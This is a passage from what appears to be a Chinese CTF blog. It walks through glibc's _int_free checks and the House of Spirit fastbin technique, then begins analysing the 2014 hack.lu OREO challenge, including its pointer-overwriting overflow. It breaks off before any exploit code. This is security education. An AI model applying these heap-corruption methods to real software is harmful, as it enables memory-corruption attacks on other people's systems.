class="line">#endif</span><br><span class="line">      ) {</span><br><span class="line">    <span class="comment">/*&#x68C0;&#x67E5;next chunk&#x7684;size&#x662F;&#x5426;&#x5927;&#x4E8E;2&#x500D;&#x7684;SIZE_SZ(SIZE_SZ=8 on x64)*/</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize_nomask (chunk_at_offset (p, size))</span><br><span class="line">                          &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">    <span class="comment">/*&#x68C0;&#x67E5;next chunk&#x7684;size&#x662F;&#x5426;&#x5927;&#x4E8E;av-&gt;system_mem(&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;av-&gt;system_mem=128kb&#x5373;0x21000 bytes)*/</span>                      </span><br><span class="line">        || __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">                             &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">      {</span><br><span class="line">        <span class="keyword">bool</span> fail = <span class="literal">true</span>;</span><br><span class="line">        <span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">           of system_mem might result in a false positive.  Redo the test after</span></span><br><span class="line"><span class="comment">           getting the lock.  */</span></span><br><span class="line">        <span class="keyword">if</span> (!have_lock)</span><br><span class="line">          {</span><br><span class="line">            __libc_lock_lock (av-&gt;mutex);</span><br><span class="line">            fail = (chunksize_nomask (chunk_at_offset (p, size)) &lt;= <span class="number">2</span> * SIZE_SZ</span><br><span class="line">                    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem);</span><br><span class="line">            __libc_lock_unlock (av-&gt;mutex);</span><br><span class="line">          }</span><br><span class="line">        <span class="keyword">if</span> (fail)</span><br><span class="line">          malloc_printerr (<span class="string">&quot;free(): invalid next size (fast)&quot;</span>);</span><br><span class="line">      }</span><br><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line">    atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index(size);</span><br><span class="line">    fb = &amp;fastbin (av, idx);</span><br><span class="line">    <span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">    mchunkptr old = fastbin_push_entry (fb, p);</span><br><span class="line">    <span class="comment">/* Check that size of fastbin chunk at the top is the same as</span></span><br><span class="line"><span class="comment">       size of the chunk that we are adding.  We can dereference OLD</span></span><br><span class="line"><span class="comment">       only if we have the lock, otherwise it might have already been</span></span><br><span class="line"><span class="comment">       allocated again.  */</span></span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span></span><br><span class="line">        &amp;&amp; __builtin_expect (fastbin_index (chunksize (old)) != idx, <span class="number">0</span>))</span><br><span class="line">      malloc_printerr (<span class="string">&quot;invalid fastbin entry (free)&quot;</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Consolidate other non-mmapped chunks as they arrive.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p)) {</span><br><span class="line">    <span class="comment">/* If we&apos;re single-threaded, don&apos;t lock the arena.  */</span></span><br><span class="line">    <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">      have_lock = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (!have_lock)</span><br><span class="line">      __libc_lock_lock (av-&gt;mutex);</span><br><span class="line">    nextchunk = chunk_at_offset(p, size);</span><br><span class="line">    <span class="comment">/* Lightweight tests: check whether the block is already the</span></span><br><span class="line"><span class="comment">       top block.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (p == av-&gt;top))</span><br><span class="line">      malloc_printerr (<span class="string">&quot;double free or corruption (top)&quot;</span>);</span><br><span class="line">    <span class="comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (contiguous (av)</span><br><span class="line">                          &amp;&amp; (<span class="keyword">char</span> *) nextchunk</span><br><span class="line">                          &gt;= ((<span class="keyword">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;double free or corruption (out)&quot;</span>);</span><br><span class="line">    <span class="comment">/* Or whether the block is actually not marked used.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</span><br><span class="line">      malloc_printerr (<span class="string">&quot;double free or corruption (!prev)&quot;</span>);</span><br><span class="line">    nextsize = chunksize(nextchunk);</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize_nomask (nextchunk) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">        || __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">      malloc_printerr (<span class="string">&quot;free(): invalid next size (normal)&quot;</span>);</span><br><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line">    <span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) {</span><br><span class="line">      prevsize = prev_size (p);</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">      unlink_chunk (av, p);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top) {</span><br><span class="line">      <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line">      <span class="comment">/* consolidate forward */</span></span><br><span class="line">      <span class="keyword">if</span> (!nextinuse) {</span><br><span class="line">        unlink_chunk (av, nextchunk);</span><br><span class="line">        size += nextsize;</span><br><span class="line">      } <span class="keyword">else</span></span><br><span class="line">        clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">        Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">        not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">        been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      bck = unsorted_chunks(av);</span><br><span class="line">      fwd = bck-&gt;fd;</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>);</span><br><span class="line">      p-&gt;fd = fwd;</span><br><span class="line">      p-&gt;bk = bck;</span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">        {</span><br><span class="line">          p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">          p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        }</span><br><span class="line">      bck-&gt;fd = p;</span><br><span class="line">      fwd-&gt;bk = p;</span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      set_foot(p, size);</span><br><span class="line">      check_free_chunk(av, p);</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If the chunk borders the current high end of memory,</span></span><br><span class="line"><span class="comment">      consolidate into top</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">else</span> {</span><br><span class="line">      size += nextsize;</span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      av-&gt;top = p;</span><br><span class="line">      check_chunk(av, p);</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If freeing a large space, consolidate possibly-surrounding</span></span><br><span class="line"><span class="comment">      chunks. Then, if the total unused topmost memory exceeds trim</span></span><br><span class="line"><span class="comment">      threshold, ask malloc_trim to reduce top.</span></span><br><span class="line"><span class="comment">      Unless max_fast is 0, we don&apos;t know if there are fastbins</span></span><br><span class="line"><span class="comment">      bordering top, so we cannot tell for sure whether threshold</span></span><br><span class="line"><span class="comment">      has been reached unless fastbins are consolidated.  But we</span></span><br><span class="line"><span class="comment">      don&apos;t want to consolidate on each free.  As a compromise,</span></span><br><span class="line"><span class="comment">      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</span></span><br><span class="line"><span class="comment">      is reached.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) {</span><br><span class="line">      <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">        malloc_consolidate(av);</span><br><span class="line">      <span class="keyword">if</span> (av == &amp;main_arena) {</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span></span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(chunksize(av-&gt;top)) &gt;=</span><br><span class="line">            (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(mp_.trim_threshold))</span><br><span class="line">          systrim(mp_.top_pad, av);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      } <span class="keyword">else</span> {</span><br><span class="line">        <span class="comment">/* Always try heap_trim(), even if the top chunk is not</span></span><br><span class="line"><span class="comment">           large, because the corresponding heap might go away.  */</span></span><br><span class="line">        heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line">        assert(heap-&gt;ar_ptr == av);</span><br><span class="line">        heap_trim(heap, mp_.top_pad);</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> (!have_lock)</span><br><span class="line">      __libc_lock_unlock (av-&gt;mutex);</span><br><span class="line">  }</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If the chunk was allocated via mmap, release via munmap().</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">else</span> {</span><br><span class="line">    munmap_chunk (p);</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>_int_free&#x4E2D;&#x6709;&#x51E0;&#x4E2A;&#x91CD;&#x8981;&#x7684;if&#x5224;&#x65AD;</p>
<p>####1. <code>if ((unsigned long)(size) &lt;= (unsigned long)(get_max_fast ())</code><br>&#x8FD9;&#x4E2A;if&#x548C;fastbin&#x6709;&#x5173;&#xFF0C;&#x7528;&#x6765;&#x5224;&#x65AD;&#x8981;&#x91CA;&#x653E;&#x7684;chunk&#x662F;&#x5426;&#x662F;fast chunk&#xFF0C;&#x5173;&#x4E8E;MAX_FAST_SIZE&#x7684;&#x5B9A;&#x4E49;&#x5982;&#x4E0B;&#xFF1A;<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The maximum fastbin request size we support */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_FAST_SIZE     (80 * SIZE_SZ / 4)</span></span><br></pre></td></tr></table></figure></p>
<p>SIZE_SZ=8 on x64&#xFF0C;SIZE_SZ=4 on x32&#xFF0C;&#x8FD9;&#x4E2A;MAX_FAST_SIZE&#x662F;&#x5305;&#x62EC;chunk&#x5934;&#x7684;&#x5927;&#x5C0F;&#xFF0C;&#x6240;&#x4EE5;64&#x4F4D;&#x4E0B;MAX_FAST_SIZE=160 bytes,32&#x4F4D;&#x4E0B;MAX_FAST_SIZE=80 bytes&#xFF0C;&#x4F46;&#x662F;&#x5B9E;&#x9645;&#x4F7F;&#x7528;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;64&#x4F4D;&#x4E0B;&#x6700;&#x5927;&#x4E3A;128bytes&#xFF0C;32&#x4F4D;&#x4E0B;&#x6700;&#x5927;&#x4E3A;64bytes</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/03/08/2014-hack.lu CTF-OREO-[House of spirit]/">2014-hack.lu CTF-OREO-[House of spirit]</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-03-08</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/fastbin-attack/">fastbin attack</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/House-of-spirit/">House of spirit</a></span><div class="content"><h3 id="House-of-spirit"><a href="#House-of-spirit" class="headerlink" title="House of spirit"></a>House of spirit</h3><p>House of spirit&#x662F;&#x6587;&#x7AE0;&#x201C;The Mallo Maleficarum&#x201D;&#x63D0;&#x51FA;&#x7684;&#x4E00;&#x79CD;&#x5229;&#x7528;fastbin&#x5B9E;&#x65BD;&#x7684;&#x5806;&#x5229;&#x7528;&#x6280;&#x672F;&#xFF0C;&#x66F4;&#x50CF;&#x4E00;&#x79CD;&#x5185;&#x5B58;&#x6F0F;&#x6D1E;&#x5229;&#x7528;&#x6280;&#x672F;&#x7684;&#x601D;&#x60F3;&#x3002;&#x5176;&#x601D;&#x60F3;&#x5C31;&#x662F;&#x6784;&#x9020;&#x4E00;&#x4E2A;fake chunk&#x4F7F;&#x5F97;&#x5185;&#x5B58;&#x5206;&#x914D;&#x5668;&#x9519;&#x8BEF;&#x7684;&#x5206;&#x914D;&#x5230;&#x6211;&#x4EEC;&#x53EF;&#x63A7;&#x7684;&#x5185;&#x5B58;&#x533A;&#x57DF;&#xFF0C;&#x8FDB;&#x800C;&#x8FBE;&#x5230;&#x4EFB;&#x610F;&#x5730;&#x5740;&#x8BFB;&#x5199;&#x7684;&#x7684;&#x6548;&#x679C;&#x3002;&#x8BE5;&#x653B;&#x51FB;&#x9002;&#x5408;&#x7528;&#x6237;&#x63A7;&#x5236;&#x4E86;&#x4F4E;&#x5730;&#x5740;(chunk&#x5934;)&#x3001;&#x9AD8;&#x5730;&#x5740;(next chunk&#x5934;)&#xFF0C;&#x9700;&#x8981;&#x901A;&#x8FC7;House of spirit&#x6765;&#x63A7;&#x5236;&#x4E2D;&#x95F4;&#x5730;&#x5740;&#x7684;&#x60C5;&#x666F;</p>
<p>House of sirit&#x7684;&#x6761;&#x4EF6;&#x4E0E;&#x57FA;&#x672C;&#x601D;&#x8DEF;&#x5982;&#x4E0B;&#xFF1A;</p>
<ol>
<li>&#x7A0B;&#x5E8F;&#x5B58;&#x5728;&#x6F0F;&#x6D1E;&#x53EF;&#x4EE5;&#x63A7;&#x5236;&#x4E00;&#x4E2A;free&#x51FD;&#x6570;&#x7684;&#x53C2;&#x6570;&#x2014;&#x2014;&#x6307;&#x9488;P</li>
<li><p>&#x53EF;&#x5728;&#x53EF;&#x63A7;&#x5185;&#x5B58;&#x533A;&#x57DF;(.bss,stack,heap)&#x4E0A;&#x6784;&#x9020;&#x4E00;&#x4E2A;fake fastchunk</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="code">+------------------+</span></span><br><span class="line">|     &#x53EF;&#x63A7;&#x533A;&#x57DF;1     |</span><br><span class="line"><span class="code">+------------------+</span></span><br><span class="line">| &#x76EE;&#x6807;&#x533A;&#x57DF;&#xFF08;&#x4E0D;&#x53EF;&#x63A7;&#xFF0C;  |</span><br><span class="line">| &#x591A;&#x4E3A;&#x8FD4;&#x56DE;&#x5730;&#x5740;&#x6216;&#x51FD;&#x6570;  |</span><br><span class="line">| &#x6307;&#x9488;&#x7B49;&#xFF09;          |</span><br><span class="line"><span class="code">+------------------+</span></span><br><span class="line">|     &#x53EF;&#x63A7;&#x533A;&#x57DF;2     |</span><br><span class="line"><span class="code">+------------------+</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>&#x5C06;&#x6307;&#x9488;P&#x4FEE;&#x6539;&#x4E3A;fack fastchunk&#x7684;chunk address&#xFF0C;&#x5C06;&#x5176;free&#x5230;FastbinY[i]&#x5355;&#x94FE;&#x8868;&#x4E2D;</p>
</li>
<li>&#x518D;&#x6B21;&#x7533;&#x8BF7;&#x540C;&#x6837;&#x5927;&#x5C0F;&#x7684;chunk&#xFF0C;&#x4F1A;&#x8FD4;&#x56DE;fake fastchunk&#xFF0C;&#x7ED3;&#x5408;&#x7A0B;&#x5E8F;&#x7684;&#x529F;&#x80FD;&#x5B9E;&#x73B0;&#x4EFB;&#x610F;&#x5730;&#x5740;&#x8BFB;&#x5199;&#x7684;&#x6548;&#x679C;</li>
</ol>
<p>&#x5173;&#x952E;&#x5C31;&#x662F;&#x5982;&#x4F55;&#x6B63;&#x786E;&#x4F2A;&#x9020;&#x4E00;&#x4E2A;fake fastchunk&#xFF0C;&#x6765;&#x7ED5;&#x8FC7;glic&#x7684;&#x5B89;&#x5168;&#x68C0;&#x6D4B;</p>
<h3 id="glibc&#x4E2D;&#x5173;&#x4E8E;&#x91CA;&#x653E;fast-chunk&#x7684;&#x5B89;&#x5168;&#x68C0;&#x6D4B;"><a href="#glibc&#x4E2D;&#x5173;&#x4E8E;&#x91CA;&#x653E;fast-chunk&#x7684;&#x5B89;&#x5168;&#x68C0;&#x6D4B;" class="headerlink" title="glibc&#x4E2D;&#x5173;&#x4E8E;&#x91CA;&#x653E;fast chunk&#x7684;&#x5B89;&#x5168;&#x68C0;&#x6D4B;"></a>glibc&#x4E2D;&#x5173;&#x4E8E;&#x91CA;&#x653E;fast chunk&#x7684;&#x5B89;&#x5168;&#x68C0;&#x6D4B;</h3><p>&#x5806;&#x7684;&#x91CA;&#x653E;&#x51FD;&#x6570;&#x5B9A;&#x4E49;&#x5728;_libc_free&#x51FD;&#x6570;&#x4E2D;&#xFF0C;&#x901A;&#x8FC7;&#x6E90;&#x7801;&#x5206;&#x6790;&#xFF0C;&#x6B63;&#x5E38;&#x91CA;&#x653E;&#x4E00;&#x4E2A;fastchunk&#x65F6;&#x6709;&#x4E94;&#x4E2A;&#x5B89;&#x5168;&#x68C0;&#x6D4B;</p>
<ol>
<li>&#x5728;_libc_free&#x51FD;&#x6570;&#x4E2D;&#xFF0C;&#x4F1A;&#x68C0;&#x6D4B;&#x8BE5;chunk&#x662F;&#x5426;&#x901A;&#x8FC7;mmap&#x7533;&#x8BF7;&#xFF0C;&#x5373;&#x68C0;&#x6D4B;chunk&#x7684;ISMMAP&#x6807;&#x5FD7;&#x4F4D;&#xFF0C;&#x5373; A|M|P &#x4E2D;&#x7684;&#x7B2C;&#x4E8C;&#x4F4D;&#xFF0C;&#x5982;&#x679C;<code>ISMMAP</code>&#x4E3A;1&#x7684;&#x8BDD;&#xFF0C;&#x5C31;&#x8BF4;&#x660E;&#x8BE5;chunk&#x662F;&#x901A;&#x8FC7;<code>mmap</code>&#x7533;&#x8BF7;&#x7684;&#x7A7A;&#x95F4;&#xFF0C;&#x5C31;&#x4F1A;&#x8C03;&#x7528;munmap&#x51FD;&#x6570;&#x8FDB;&#x884C;&#x91CA;&#x653E;,&#x540C;&#x65F6;&#x5BF9;mmap&#x5206;&#x914D;mmap_threshold&#x53CA;&#x6536;&#x7F29;trim_threshold&#x9608;&#x503C;&#x8FDB;&#x884C;&#x8C03;&#x6574;&#x3002;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x8981;&#x5C06;&#x5B83;&#x7F6E;0&#x3002;<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (chunk_is_mmapped (p))                       <span class="comment">/* release mmapped memory. */</span></span><br><span class="line">  {</span><br><span class="line">    <span class="comment">/* See if the dynamic brk/mmap threshold needs adjusting.</span></span><br><span class="line"><span class="comment">       Dumped fake mmapped chunks do not affect the threshold.  */</span></span><br><span class="line">    <span class="keyword">if</span> (!mp_.no_dyn_threshold</span><br><span class="line">        &amp;&amp; chunksize_nomask (p) &gt; mp_.mmap_threshold</span><br><span class="line">        &amp;&amp; chunksize_nomask (p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX</span><br><span class="line">        &amp;&amp; !DUMPED_MAIN_ARENA_CHUNK (p))</span><br><span class="line">      {</span><br><span class="line">        mp_.mmap_threshold = chunksize (p);</span><br><span class="line">        mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">        LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</span><br><span class="line">                    mp_.mmap_threshold, mp_.trim_threshold);</span><br><span class="line">      }</span><br><span class="line">    munmap_chunk (p);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  }</span><br></pre></td></tr></table></figure>
</li>
</ol>
<blockquote>
<p>&#x4E0B;&#x9762;&#x662F;_libc_free&#x51FD;&#x6570;&#x4E2D;&#x5B50;&#x51FD;&#x6570;<code>_int_free</code>&#x7684;&#x5B89;&#x5168;&#x68C0;&#x67E5;</p>
</blockquote>
<ol start="2">
<li><p>chunk&#x6307;&#x9488;&#x7684;&#x5730;&#x5740;&#x8981;&#x5BF9;&#x9F50;&#x4E14;&#x5806;&#x6307;&#x9488;&#x4E0D;&#x80FD;&#x6EA2;&#x51FA;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect ((<span class="keyword">uintptr_t</span>) p &gt; (<span class="keyword">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;free(): invalid pointer&quot;</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>chunk&#x7684;&#x5927;&#x5C0F;&#x8981;&#x5927;&#x4E8E;MINSIZE&#x4E14;&#x5927;&#x5C0F;&#x5BF9;&#x9F50;()</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;free(): invalid size&quot;</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>chunk&#x7684;size&#x8981;&#x5C0F;&#x4E8E;fastchunk&#x652F;&#x6301;&#x7684;&#x6700;&#x5927;&#x503C;(64 bytes on x32, 128 bytes on x64)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast ())</span><br></pre></td></tr></table></figure>
</li>
<li><p>next chunk&#x7684;size&#x8981;&#x5927;&#x4E8E;2*SIZE_SZ(x86&#x4E0B;SIZE_SZ&#x4E3A;4&#xFF0C;x64&#x4E0B;&#x4E3A;8)&#xFF0C;&#x4E14;&#x5C0F;&#x4E8E;av_&gt;system_mem(&#x9ED8;&#x8BA4;&#x4E3A;128kb)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize_nomask (chunk_at_offset (p, size))</span><br><span class="line">                          &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">        || __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">                             &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="oreo&#x7A0B;&#x5E8F;&#x5206;&#x6790;"><a href="#oreo&#x7A0B;&#x5E8F;&#x5206;&#x6790;" class="headerlink" title="oreo&#x7A0B;&#x5E8F;&#x5206;&#x6790;"></a>oreo&#x7A0B;&#x5E8F;&#x5206;&#x6790;</h3><p>&#x7A0B;&#x5E8F;&#x7684;&#x529F;&#x80FD;&#x5982;&#x4E0B;&#xFF1A;<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Welcome to the OREO Original Rifle Ecommerce Online System!</span><br><span class="line"></span><br><span class="line">     ,______________________________________</span><br><span class="line">    |_________________,----------._ [____]  -,__  __....-----=====</span><br><span class="line">                   (_(||||||||||||)___________/                   |</span><br><span class="line">                      `----------&apos;   OREO [ ))&quot;-,                   |</span><br><span class="line">                                           <span class="string">&quot;&quot;</span>    `,  _,--....___    |</span><br><span class="line">                                                   `/           <span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">What would you like to <span class="keyword">do</span>?</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> Add <span class="keyword">new</span> rifle</span><br><span class="line"><span class="number">2.</span> Show added rifles</span><br><span class="line"><span class="number">3.</span> Order selected rifles</span><br><span class="line"><span class="number">4.</span> Leave a Message with your Order</span><br><span class="line"><span class="number">5.</span> Show current stats</span><br><span class="line"><span class="number">6.</span> Exit!</span><br><span class="line">Action:</span><br></pre></td></tr></table></figure></p>
<h4 id="1-Add-new-rifle"><a href="#1-Add-new-rifle" class="headerlink" title="1. Add new rifle"></a>1. Add new rifle</h4><p>&#x5B58;&#x50A8;&#x67AA;&#x652F;&#x4FE1;&#x606F;&#x7684;&#x7ED3;&#x6784;&#x4F53;&#x5360;&#x7528;0x38&#x4E2A;&#x5B57;&#x8282;&#xFF0C;<code>*((_DWORD *)dword_804A288 + 13) = v1;</code>&#x662F;&#x5C06;dword_804A288+52(4x13)&#x5904;&#x8BB0;&#x5F55;&#x4E0A;&#x4E00;&#x4E2A;chunk&#x7684;&#x5730;&#x5740;last_chunk,&#x6240;&#x4EE5;0x804A288&#x5B58;&#x50A8;&#x7684;&#x4E00;&#x76F4;&#x662F;&#x6700;&#x65B0;&#x7533;&#x8BF7;&#x7684;chunk&#x8FD4;&#x56DE;&#x7684;&#x6307;&#x9488;&#x3002;&#x4E14;0x804A2A4&#x4E2D;&#x7684;&#x6570;&#x636E;&#x81EA;&#x589E;1&#xFF0C;&#x53EF;&#x4EE5;&#x731C;&#x6D4B;&#x8FD9;&#x4E2A;&#x5730;&#x5740;&#x5B58;&#x50A8;&#x4E86;&#x8BA2;&#x5355;&#x4E2A;&#x6570;&#x3002;</p>
<p>&#x6240;&#x4EE5;&#x5B58;&#x50A8;&#x67AA;&#x652F;&#x4FE1;&#x606F;&#x5927;&#x6982;&#x7684;&#x7ED3;&#x6784;&#x4F53;&#x662F;&#xFF1A;<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rifle</span> {</span></span><br><span class="line">    <span class="keyword">char</span> descript[<span class="number">25</span>]</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">27</span>]</span><br><span class="line">    <span class="keyword">char</span> *last_chunk</span><br><span class="line">}</span><br></pre></td></tr></table></figure></p>
<p>&#x5176;&#x4E2D;fget&#x5B58;&#x5728;&#x6EA2;&#x51FA;&#x6F0F;&#x6D1E;&#xFF0C;&#x53EF;&#x4EE5;&#x8986;&#x76D6;name&#x540E;&#x7684;*last_chunk&#x6307;&#x9488;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x83B7;&#x5F97;&#x4E00;&#x4E2A;&#x53EF;&#x63A7;&#x7684;&#x6307;&#x9488;&#x3002;<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">v1 = dword_804A288;</span><br><span class="line">  dword_804A288 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x38</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( dword_804A288 )</span><br><span class="line">  {</span><br><span class="line">    